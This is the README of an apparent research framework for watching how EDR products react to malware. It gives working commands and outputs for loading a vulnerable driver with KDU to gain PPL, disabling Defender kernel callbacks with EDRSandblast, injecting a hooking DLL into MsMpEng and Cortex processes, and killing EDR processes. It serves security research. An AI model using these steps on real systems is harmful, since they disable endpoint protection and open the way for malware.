# EDR-Introspection
This project enables the Introspection into EDR products, i.e. what the EDR is doing at a given step for malware analysis. 
The enabling technologies of this projects are:
- ETW and ETW-TI tracing and filtering for relevant events (related to malware and EDR operations)
- hooking of the EDR's ntdll to inspect the EDRs actions

## How
- krabsETW to parse all relevant ETW providers
- EDRi.exe to 
	- filter the ETW events
	- decrypt and run predefined attacks
	- hook ntdll of EDR procs
- [kdu.exe](https://github.com/hfiref0x/KDU) to run procs as PPL-AntiMalware
- [EDRSandblast](https://github.com/cailllev/EDRSandblast) to disable kernel callbacks

## How To
### Run the Framework
Depends on the EDR, harderning, etc. Generally, loading of vulnerable signed drivers and memory integrity (both in Device Security > Core Isolation) must be disabled for KDU and EDRSandblast to work.
Without EDRSandblast (without disabling kernel callbacks) the hooks cannot be injected. Without KDU (without PPL) no ETW-TI can be consumed and no hooks can be injected.<br><br>
It is recomended to **make an exclusion** for the EDR-Introspection folder, and **then** clone the repo to this folder!
```powershell
# print help
.\x64\Release\EDRi.exe -h

# run simplest attack: no ETW-TI, no hooking, minimal traces, run attack as child proc, no debug
.\x64\Release\EDRi.exe --edr-profile MDE --attack Injector_standard -r

# opposite: ETW-TI, hooking ntdll, all traces, debug
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\EDRi.exe --edr-profile MDE --attack Injector_deconditioning_alloc -t -d" -prv 54
```

### Create own attack
1. Copy folder `.\attacks\Injector` to `.\attacks\YourAttack`
2. rename all references in vcproj files from `Injector` to `YourAttack`
3. build YourAttack with all features: `.\attacks\YourAttack\build-features.bat`
4. the created (encrypted) exes should now be visible in the EDRi under available attacks
```powershell
# print just the attacks
.\x64\Release\EDRi.exe --edr-profile MDE --attack 
```

## Requirements
* Windows 10 / 11 (others not tested)
* ability to load vulnerable drivers (when testing with ETW-TI or ntdll hooking)
* excluding the EDR-Introspection/ folder from your EDR

## Misc Tools
To play around or test stuff, helper exes are provided for the following actions.
All tools below must be run as Administrator.

### Start a Proc as PPL-AntiMalware
Normally EDR processes run as PPL-AntiMalware. The kernel only allows opening of these processes via `OpenProcess("edr.exe")` from other PPL-AntiMalware procs (or higher).
To run any process as PPL-AntiMalware:
```powershell
.\helpers\KDU\kdu.exe -pse "powershell.exe" -prv 54
```
Hint: When running a subprocess from these powershell procs, the subprocesses have no PPL flag anymore. If needed, run these subprocesses directly with kdu.exe, not via powershell.exe.
Example for opening an EDR proc and reading the loaded DLLs:
```powershell
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\ReadPEB.exe $((Get-Process MsMpEng).Id)" -prv 54
# [*] Reading PEB from process pid=3292
# [*] Got PBI.PebBaseAddress = 0x0000003EEDA3F000
# [*] Got remote PEB.LDR     = 0x00007FFBA1192920
# [*] Got remote remoteHead  = 0x00007FFBA1192940
# [+] Found entry: base=0x00007FF7AAE50000, size=0x0000000000043000, ldr=0x0000020C7B1056F0, name=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng.exe
# [+] Found entry: base=0x00007FFBA0FC0000, size=0x0000000000268000, ldr=0x0000020C7B105540, name=C:\WINDOWS\SYSTEM32\ntdll.dll
# [+] Found entry: base=0x00007FFB9FD20000, size=0x00000000000C9000, ldr=0x0000020C7B105D20, name=C:\WINDOWS\SYSTEM32\KERNEL32.DLL
# [+] Found entry: base=0x00007FFB9E6B0000, size=0x00000000003F8000, ldr=0x0000020C7B1064A0, name=C:\WINDOWS\SYSTEM32\KERNELBASE.dll
# ...
```

### Disabling kernel callbacks
EDR products usually downgrad access to their processes, meaning even after a successful `OpenProcess("edr.exe")` via a PPL-AntiMalware process, the final GrantedAccess is downgraded.
MDE example:
```powershell
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\InjectLoader.exe $(pwd)\x64\Release\EDRReflectiveHooker.dll $((Get-Process MsMpEng).Id) R" -prv 54
# OpenProcess(MsMpEng) succeeds
# VirtualAlloc fails:
# 0x1ff7d4 -> PROCESS_SET_SESSIONID | PROCESS_VM_READ | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA | PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_LIMITED_INFORMATION, not including: PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_SUSPEND_RESUME
```
Cortex EDR example:
```powershell
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\InjectLoader.exe $(pwd)\x64\Release\EDRReflectiveHooker.dll $((Get-Process cyserver).Id) R" -prv 54
# OpenProcess(cyserver) succeeds
# VirtualAlloc fails:
# 0x101400 -> PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION, not including: PROCESS_SET_SESSIONID | PROCESS_VM_READ | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA | PROCESS_SET_INFORMATION | PROCESS_SET_LIMITED_INFORMATION | PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_SUSPEND_RESUME
```
Therefore the callbacks must be removed, this can be done with (my fork of) [EDRSandblast](https://github.com/cailllev/EDRSandblast):
```powershell
.\x64\Release\tools\EDRSandblast.exe toggle_callbacks 0e1 --kernelmode -i
# ...
# [+] [ObjectCallblacks]          Callback at FFFFBB034F3F8E00 for handle creations & duplications:
# [+] [ObjectCallblacks]                  Status: Enabled
# [+] [ObjectCallblacks]                  Preoperation at 0xfffff8053aa2e540 [WdFilter.sys + 0x2e540]
# [+] [ObjectCallblacks]                  Callback belongs to an EDR and is enabled!
# ...
# [+] [ObjectCallblacks]  Disabling WdFilter.sys callback at 0xFFFFBB034F3F8E00 ...
# [+] Press ENTER to enable callbacks again:
```

### Ntdll hooking of any process
Now the same command from above works when the relevant callbacks got disabled:
```powershell
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\InjectLoader.exe $(pwd)\x64\Release\EDRReflectiveHooker.dll $((Get-Process MsMpEng).Id) R" -prv 54
# [*] InjectLoader: Attempting to inject DLL 'C:\Users\hacker\source\repos\EDR-Introspection\x64\Release\EDRReflectiveHooker.dll' into PID=3292 using Reflective injection method.
# [+] Hooker: GrantedAccess to pid 3292: 0x1fffff -> full access
```

### Reading custom ETW events
The EDRReflectiveHooker.dll emits basic ETW events to track the actions of the EDR:
```powershell
.\x64\Release\ETWDump.exe Hooks
```

### Example attacks
`\attacks\` contains some (encrypted) attacks, which also emit basic ETW events to track the attacks actions.
To decrypt and use the attacks: 
```powershell
.\x64\Release\EDRi.exe -c "$(pwd)\x64\Release\attacks\attackX.exe.enc"
```
This drops an `attackX.exe` into `\x64\Release\attacks\`.

### Terminating a process
When you just want to terminate a process because it's buggy, something broke, etc., use this:
```powershell
.\helpers\KDU\kdu.exe -pse "$(pwd)\x64\Release\ProcTerminator.exe <pid>" -prv 54
```
Hint: If it's an EDR proc, you might also want to disable kernel callbacks to get full access to the proc, see above.
